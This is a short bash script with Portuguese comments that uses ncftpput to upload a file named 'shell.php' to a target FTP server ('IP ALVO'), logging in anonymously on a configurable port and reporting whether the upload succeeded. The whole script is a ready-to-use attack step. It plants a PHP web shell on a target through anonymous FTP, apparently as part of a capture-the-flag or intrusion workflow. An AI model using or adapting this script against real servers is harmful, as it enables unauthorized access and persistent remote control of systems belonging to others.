#!/bin/bash

# Define as variáveis de servidor, usuário, senha e porta
server="IP ALVO"
username="anonymous"    #modifique usuario 
password="anonymous"    #modifique senha 
port=21000  #modifique pela porta  FTP do seu alvo

# Define o nome do arquivo a ser enviado
file="shell.php"   #coloque o arquivo que vc queira transferir  

# Envia o arquivo usando o comando ncftp
ncftpput -P "$port" -u "$username" -p "$password" "$server" /PATH/  "$file"

# Verifica se o upload foi bem-sucedido
if [ $? -eq 0 ]; then
  echo "Arquivo enviado com sucesso para o servidor FTP."
else
  echo "Ocorreu um erro ao enviar o arquivo para o servidor FTP."
fi
